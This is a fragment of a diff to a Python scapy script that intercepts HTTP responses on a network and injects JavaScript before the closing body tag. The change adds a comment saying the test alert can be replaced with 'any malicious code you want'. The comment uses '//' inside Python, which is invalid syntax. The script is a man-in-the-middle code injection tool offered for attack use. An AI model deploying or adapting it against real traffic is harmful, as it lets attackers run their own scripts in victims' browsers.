@@ -24,7 +24,7 @@ def process_packet(packet):
 				
 			elif scapy_packet[scapy.TCP].sport == 10000:
 				print("[+] Response")
-				injection_code = "<script>alert('test');</script>"
+				injection_code = "<script>alert('test');</script>"   //You can change this javascript code with any malicious code you want.
 				load = load.replace("</body>", injection_code + "</body>")
 				content_length_search = re.search("(?:Content-Length: \s)(\d*)", load)
 				if content_length_search and "text/html" in load:
